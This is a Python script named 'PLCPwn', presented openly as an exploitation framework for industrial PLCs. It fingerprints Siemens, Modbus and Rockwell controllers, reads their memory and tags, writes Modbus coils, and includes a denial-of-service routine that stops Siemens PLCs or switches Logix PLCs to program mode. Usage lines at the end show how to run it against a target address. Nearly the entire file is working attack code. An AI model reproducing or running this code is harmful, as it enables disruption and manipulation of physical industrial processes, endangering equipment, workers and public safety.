#!/usr/bin/env python3
"""
PLCPwn - Multi-vendor PLC exploitation framework
Similar to Metasploit for ICS
"""

import snap7
from pymodbus.client import ModbusTcpClient
from pycomm3 import LogixDriver

class PLCPwn:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.target_type = None
        self.connection = None

    def detect_plc_type(self):
        """
        Fingerprint PLC vendor/model
        """
        print(f"[*] Fingerprinting {self.target_ip}...")

        # Try S7comm (port 102)
        try:
            plc = snap7.client.Client()
            plc.connect(self.target_ip, 0, 1, tcpport=102)
            cpu_info = plc.get_cpu_info()
            self.target_type = f"Siemens {cpu_info.ModuleTypeName}"
            plc.disconnect()
            return "siemens"
        except:
            pass

        # Try Modbus (port 502)
        try:
            client = ModbusTcpClient(self.target_ip, port=502, timeout=2)
            if client.connect():
                result = client.read_holding_registers(0, 1)
                if not result.isError():
                    self.target_type = "Modbus PLC (Schneider/Generic)"
                    client.close()
                    return "modbus"
        except:
            pass

        # Try EtherNet/IP (port 44818)
        try:
            with LogixDriver(self.target_ip, init_info=False, init_tags=False) as plc:
                info = plc.get_plc_info()
                self.target_type = f"Rockwell {info['product_name']}"
                return "logix"
        except:
            pass

        print("[-] Unable to identify PLC type")
        return None

    def exploit_read_memory(self):
        """
        Read PLC memory (registers, tags, etc.)
        """
        plc_type = self.detect_plc_type()

        if plc_type == "siemens":
            return self._s7_read_memory()
        elif plc_type == "modbus":
            return self._modbus_read_memory()
        elif plc_type == "logix":
            return self._logix_read_tags()

    def _s7_read_memory(self):
        plc = snap7.client.Client()
        plc.connect(self.target_ip, 0, 1)

        # Read DB1 (Data Block 1), starting at byte 0, read 100 bytes
        data = plc.db_read(1, 0, 100)

        plc.disconnect()
        return data

    def _modbus_read_memory(self):
        client = ModbusTcpClient(self.target_ip, port=502)
        client.connect()

        # Read first 100 holding registers
        result = client.read_holding_registers(0, 100, unit=1)

        client.close()
        return result.registers

    def _logix_read_tags(self):
        with LogixDriver(self.target_ip) as plc:
            tags = plc.get_tag_list()
            return tags

    def exploit_write_output(self, address, value):
        """
        Write to PLC output (coil, tag, etc.)
        """
        plc_type = self.detect_plc_type()

        if plc_type == "modbus":
            client = ModbusTcpClient(self.target_ip, port=502)
            client.connect()
            client.write_coil(address, value, unit=1)
            client.close()
            print(f"[+] Written {value} to coil {address}")

    def exploit_dos(self):
        """
        Denial of service attack
        """
        plc_type = self.detect_plc_type()

        if plc_type == "siemens":
            plc = snap7.client.Client()
            plc.connect(self.target_ip, 0, 1)
            plc.plc_stop()
            print("[+] Siemens PLC stopped")
            plc.disconnect()

        elif plc_type == "logix":
            with LogixDriver(self.target_ip) as plc:
                plc.set_plc_mode('PROGRAM')
                print("[+] Logix PLC set to PROGRAM mode (stopped)")

# Usage
# pwn = PLCPwn('192.168.1.100')
# pwn.detect_plc_type()
# data = pwn.exploit_read_memory()
# pwn.exploit_write_output(0, True)
# pwn.exploit_dos()
